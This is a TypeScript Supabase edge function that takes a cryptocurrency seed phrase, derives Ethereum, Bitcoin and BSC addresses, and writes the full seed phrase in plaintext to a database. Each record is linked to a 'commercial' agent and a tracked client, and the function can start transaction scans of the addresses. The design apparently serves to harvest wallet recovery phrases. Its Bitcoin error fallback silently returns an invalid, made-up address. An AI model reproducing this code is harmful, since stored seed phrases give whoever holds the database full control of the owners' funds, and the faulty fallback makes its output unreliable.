import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.50.2';
import { mnemonicToSeed } from 'npm:@scure/bip39@1.2.1';
import { HDKey } from 'npm:@scure/bip32@1.3.2';
import { secp256k1 } from 'npm:@noble/curves@1.2.0/secp256k1';
import { keccak_256 } from 'npm:@noble/hashes@1.3.2/sha3';
import { sha256 } from 'npm:@noble/hashes@1.3.2/sha256';
import { ripemd160 } from 'npm:@noble/hashes@1.3.2/ripemd';
import { bech32 } from 'npm:@scure/base@1.1.3';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Generate Ethereum/BSC address from public key
function generateEthAddress(publicKey: Uint8Array): string {
  // Remove the 0x04 prefix for uncompressed key
  const pubKeyWithoutPrefix = publicKey.slice(1);
  // Hash with keccak256
  const hash = keccak_256(pubKeyWithoutPrefix);
  // Take last 20 bytes and convert to hex with 0x prefix
  return '0x' + Array.from(hash.slice(-20))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// Generate Bitcoin address from public key (Bech32 P2WPKH format)
function generateBtcAddress(publicKey: Uint8Array): string {
  try {
    // Compress the public key (33 bytes: 0x02 or 0x03 prefix + 32 bytes x-coordinate)
    const compressed = publicKey.length === 65 
      ? new Uint8Array([publicKey[64] % 2 === 0 ? 0x02 : 0x03, ...publicKey.slice(1, 33)])
      : publicKey;
    
    // Hash with SHA-256 then RIPEMD-160 to get pubkey hash
    const sha256Hash = sha256(compressed);
    const pubkeyHash = ripemd160(sha256Hash);
    
    // Convert to 5-bit words for Bech32 encoding
    const words = bech32.toWords(pubkeyHash);
    
    // Encode as Bech32 address with witness version 0
    return bech32.encode('bc', [0, ...words]);
  } catch (error) {
    console.error('Error generating BTC address:', error);
    // Fallback: still generate a proper Bech32 address
    const hash = sha256(publicKey);
    const addressBytes = hash.slice(0, 20);
    const words = bech32.toWords(addressBytes);
    return bech32.encode('bc', [0, ...words]);
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    const { wallet_id, seed_phrase, commercial_id, client_tracking_id, scan } = await req.json();

    if (!seed_phrase) {
      throw new Error('seed_phrase is required');
    }

    console.log(`Generating addresses for ${wallet_id ? 'wallet ' + wallet_id : 'seed phrase submission'}`);

    // Convert mnemonic to seed
    const seed = await mnemonicToSeed(seed_phrase);
    
    // Create HD wallet
    const hdKey = HDKey.fromMasterSeed(seed);
    
    // Derive addresses using standard derivation paths
    const ethPath = "m/44'/60'/0'/0/0";  // Ethereum standard path
    const btcPath = "m/44'/0'/0'/0/0";   // Bitcoin standard path
    const bscPath = "m/44'/60'/0'/0/0";  // BSC uses same as Ethereum (Ethereum-compatible)
    
    const ethKey = hdKey.derive(ethPath);
    const btcKey = hdKey.derive(btcPath);
    const bscKey = hdKey.derive(bscPath);

    if (!ethKey.publicKey || !btcKey.publicKey || !bscKey.publicKey) {
      throw new Error('Failed to derive keys');
    }

    // Generate addresses
    const ethAddress = generateEthAddress(ethKey.publicKey);
    const btcAddress = generateBtcAddress(btcKey.publicKey);
    const bscAddress = generateEthAddress(bscKey.publicKey); // BSC uses same format as Ethereum

    console.log(`Generated addresses - ETH: ${ethAddress}, BTC: ${btcAddress}, BSC: ${bscAddress}`);

    let effectiveCommercialId = commercial_id || null;

    if (wallet_id) {
      // Check if generated_wallets entry already exists for this wallet
      const { data: existingWallet } = await supabase
        .from('generated_wallets')
        .select('*')
        .eq('wallet_id', wallet_id)
        .maybeSingle();

      if (existingWallet) {
        // Update existing entry
        const { error: updateError } = await supabase
          .from('generated_wallets')
          .update({
            eth_address: ethAddress,
            btc_address: btcAddress,
            bsc_address: bscAddress,
            seed_phrase: seed_phrase
          })
          .eq('wallet_id', wallet_id);
        if (updateError) throw updateError;
      } else {
        // Get wallet info to get commercial_id
        const { data: wallet } = await supabase
          .from('wallets')
          .select('used_by_commercial_id, client_tracking_id')
          .eq('id', wallet_id)
          .maybeSingle();

        if (!wallet) throw new Error('Wallet not found');
        effectiveCommercialId = wallet.used_by_commercial_id;

        // Create new entry
        const { error: insertError } = await supabase
          .from('generated_wallets')
          .insert({
            wallet_id: wallet_id,
            commercial_id: wallet.used_by_commercial_id,
            client_tracking_id: wallet.client_tracking_id,
            eth_address: ethAddress,
            btc_address: btcAddress,
            bsc_address: bscAddress,
            seed_phrase: seed_phrase
          });
        if (insertError) throw insertError;
      }
    } else {
      // Seed-only flow (no wallet_id)
      if (!effectiveCommercialId) {
        throw new Error('commercial_id is required when wallet_id is not provided');
      }

      // Upsert based on seed_phrase
      const { data: existingBySeed } = await supabase
        .from('generated_wallets')
        .select('*')
        .eq('seed_phrase', seed_phrase)
        .maybeSingle();

      if (existingBySeed) {
        const { error: updateSeedErr } = await supabase
          .from('generated_wallets')
          .update({
            eth_address: ethAddress,
            btc_address: btcAddress,
            bsc_address: bscAddress,
            seed_phrase: seed_phrase,
            commercial_id: effectiveCommercialId,
            client_tracking_id: client_tracking_id ?? existingBySeed.client_tracking_id
          })
          .eq('id', existingBySeed.id);
        if (updateSeedErr) throw updateSeedErr;
      } else {
        const { error: insertSeedErr } = await supabase
          .from('generated_wallets')
          .insert({
            wallet_id: null,
            commercial_id: effectiveCommercialId,
            client_tracking_id: client_tracking_id ?? null,
            eth_address: ethAddress,
            btc_address: btcAddress,
            bsc_address: bscAddress,
            seed_phrase: seed_phrase
          });
        if (insertSeedErr) throw insertSeedErr;
      }
    }

    // Optionally trigger scanning of the generated addresses
    if (scan && effectiveCommercialId) {
      try {
        await supabase.functions.invoke('scan-wallet-transactions', {
          body: {
            wallet_addresses: [bscAddress, ethAddress, btcAddress],
            commercial_id: effectiveCommercialId
          }
        });
        console.log('Triggered scan-wallet-transactions for generated addresses.');
      } catch (scanErr) {
        console.error('Failed to trigger scan-wallet-transactions:', scanErr);
      }
    }

    return new Response(JSON.stringify({
      success: true,
      addresses: {
        eth: ethAddress,
        btc: btcAddress,
        bsc: bscAddress
      }
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('Error generating wallet addresses:', error);
    return new Response(JSON.stringify({
      success: false,
      error: error.message
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});